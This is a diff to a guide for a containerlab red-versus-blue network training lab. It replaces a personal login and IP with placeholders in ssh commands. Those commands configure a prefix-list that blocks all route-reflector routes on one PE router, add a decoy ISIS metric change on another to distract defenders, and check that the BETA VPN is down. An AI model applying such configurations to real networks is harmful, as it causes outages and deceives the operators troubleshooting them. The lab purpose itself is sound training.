@@ -44,7 +44,7 @@ write memory
 Connect to PE5 and PE6 via:
 ```bash
 # PE5 - Block RR routes (real attack)
-ssh hhildenbrand@192.168.1.12 "docker exec clab-red-vs-blue-v3-pe5 Cli -c 'configure terminal
+ssh labuser@<server-ip> "docker exec clab-red-vs-blue-v3-pe5 Cli -c 'configure terminal
 ip prefix-list DENY-ALL deny 0.0.0.0/0 le 32
 route-map RR-BLOCK-IN deny 10
 match ip address prefix-list DENY-ALL
@@ -58,7 +58,7 @@ end
 write memory'"
 
 # PE6 - Decoy metric change
-ssh hhildenbrand@192.168.1.12 "docker exec clab-red-vs-blue-v3-pe6 Cli -c 'configure terminal
+ssh labuser@<server-ip> "docker exec clab-red-vs-blue-v3-pe6 Cli -c 'configure terminal
 interface Ethernet1
 isis metric 999
 exit
@@ -71,13 +71,13 @@ write memory'"
 After attack, verify BETA VPN is broken:
 ```bash
 # Check PE5 BGP
-ssh hhildenbrand@192.168.1.12 "docker exec clab-red-vs-blue-v3-pe5 Cli -c 'show ip bgp summary'"
+ssh labuser@<server-ip> "docker exec clab-red-vs-blue-v3-pe5 Cli -c 'show ip bgp summary'"
 
 # Check PE6 ISIS (decoy)
-ssh hhildenbrand@192.168.1.12 "docker exec clab-red-vs-blue-v3-pe6 Cli -c 'show isis interface'"
+ssh labuser@<server-ip> "docker exec clab-red-vs-blue-v3-pe6 Cli -c 'show isis interface'"
 
 # Verify BETA VPN broken
-ssh hhildenbrand@192.168.1.12 "docker exec clab-red-vs-blue-v3-ce2 ping -c 3 192.168.5.2"
+ssh labuser@<server-ip> "docker exec clab-red-vs-blue-v3-ce2 ping -c 3 192.168.5.2"
 ```
 
 Expected result: **BETA VPN completely down**, with PE6 ISIS changes as distraction.
